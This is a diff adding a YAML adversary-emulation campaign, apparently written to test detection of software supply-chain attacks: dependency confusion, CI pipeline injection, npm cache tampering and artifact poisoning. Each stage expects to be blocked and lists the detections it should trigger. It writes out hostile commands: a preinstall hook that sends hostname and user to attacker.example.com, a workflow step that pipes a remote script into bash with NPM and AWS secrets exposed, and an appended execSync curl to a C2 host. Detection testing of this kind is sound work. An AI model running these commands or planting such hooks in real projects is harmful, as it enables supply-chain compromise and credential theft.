@@ -1,0 +1,112 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: supply-chain-compromise
+  adversary: lazarus-group
+  description: "Software supply chain compromise — inject malicious code through dependency confusion, typosquatted packages, and compromised CI/CD pipelines."
+  objective: "Validate detection of supply chain attack vectors including dependency confusion, package integrity violations, and CI/CD pipeline manipulation."
+  mitre_version: "15.1"
+  severity: critical
+  tags: [supply-chain, dependency-confusion, ci-cd, package-tampering]
+  authors: ["ThreatEcho"]
+  created: "2024-12-08"
+  modified: "2025-05-22"
+
+variables:
+  internal_registry: "https://registry.corp.example.com"
+  public_registry: "https://registry.npmjs.org"
+  target_package: "corp-auth-utils"
+  ci_server: "https://ci.corp.example.com"
+
+stages:
+  - id: dependency-confusion
+    name: Dependency Confusion Attack
+    technique: T1195.001
+    tactic: initial-access
+    description: "Publish a higher-version package with the same name as an internal package to a public registry, triggering automatic installation."
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          cat > /tmp/package.json << 'EOF'
+          {
+            "name": "{{target_package}}",
+            "version": "99.0.0",
+            "scripts": {
+              "preinstall": "curl https://attacker.example.com/exfil?host=$(hostname)&user=$(whoami)"
+            }
+          }
+          EOF
+          npm publish /tmp/package.json --registry {{public_registry}}
+    expect:
+      outcome: blocked
+      telemetry: [process_creation, network_connection, file_write]
+      detections: [dependency_confusion_detected, public_package_name_collision, preinstall_script_execution]
+    on_failure: continue
+
+  - id: ci-pipeline-injection
+    name: CI Pipeline Injection
+    technique: T1195.002
+    tactic: initial-access
+    description: "Modify CI/CD pipeline configuration to inject malicious build steps that execute during the build process."
+    depends_on: [dependency-confusion]
+    execute:
+      type: file
+      target: ".github/workflows/build.yml"
+      args:
+        action: write
+        content: |
+          - name: Debug diagnostics
+            run: |
+              curl -s https://attacker.example.com/payload.sh | bash
+            env:
+              NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+              AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
+    expect:
+      outcome: blocked
+      telemetry: [file_modification, ci_event]
+      detections: [pipeline_config_modification, secret_exfiltration_in_ci, unauthorized_build_step]
+    on_failure: continue
+
+  - id: package-integrity-bypass
+    name: Package Integrity Bypass
+    technique: T1195.002
+    tactic: defense-evasion
+    description: "Modify a cached package artifact after integrity check but before installation to bypass hash verification."
+    depends_on: [ci-pipeline-injection]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          # Locate npm cache and modify package post-verification
+          CACHE_DIR=$(npm config get cache)
+          find "$CACHE_DIR" -name "{{target_package}}-*.tgz" -exec tar xzf {} -C /tmp/tamper/ \;
+          echo 'require("child_process").execSync("curl https://attacker.example.com/c2")' >> /tmp/tamper/package/index.js
+          cd /tmp/tamper && tar czf "$CACHE_DIR/{{target_package}}-tampered.tgz" package/
+    expect:
+      outcome: blocked
+      telemetry: [file_modification, process_creation]
+      detections: [cache_tampering, post_verification_modification, package_integrity_violation]
+    on_failure: continue
+
+  - id: build-artifact-poisoning
+    name: Build Artifact Poisoning
+    technique: T1195.002
+    tactic: impact
+    description: "Replace a legitimate build artifact in the artifact repository with a backdoored version."
+    depends_on: [package-integrity-bypass]
+    execute:
+      type: http
+      target: "{{internal_registry}}/api/v1/packages/{{target_package}}/versions/2.3.1"
+      args:
+        method: PUT
+        content_type: "application/octet-stream"
+        payload_file: "/tmp/tamper/backdoored-artifact.tgz"
+    expect:
+      outcome: blocked
+      telemetry: [api_call, file_upload]
+      detections: [artifact_replacement_detected, registry_upload_anomaly, unsigned_artifact_push]
+    on_failure: abort
